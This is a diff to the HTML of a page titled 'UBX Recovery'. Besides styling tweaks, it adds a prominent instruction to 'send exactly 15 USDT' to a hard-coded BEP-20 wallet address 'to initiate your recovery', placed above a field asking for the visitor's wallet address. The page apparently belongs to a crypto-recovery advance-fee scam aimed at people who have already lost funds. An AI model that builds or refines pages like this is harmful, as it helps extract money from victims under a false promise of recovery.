@@ -12,7 +12,7 @@
     }
 
     .container {
-      max-width: 400px;
+      max-width: 450px;
       margin: 0 auto;
       background: white;
       padding: 30px;
@@ -50,6 +50,14 @@
       font-weight: bold;
       display: none;
     }
+
+    .wallet-box {
+      background-color: #f5f5f5;
+      border-radius: 5px;
+      padding: 10px;
+      font-weight: bold;
+      margin: 10px 0 20px;
+    }
   </style>
 </head>
 <body>
@@ -58,6 +66,12 @@
     <img src="logo.png" alt="Logo" class="logo">
 
     <h2>UBX Recovery</h2>
+
+    <p><strong>Send exactly 15 USDT to the following address to initiate your recovery:</strong></p>
+    <div class="wallet-box">
+      0xB2801391e58e4D973836D2B26B9b7E77CCd08f7C
+    </div>
+
     <p><strong>Network:</strong> BEP 20 (BSC)</p>
 
     <input type="text" placeholder="Your Wallet Address" id="wallet">
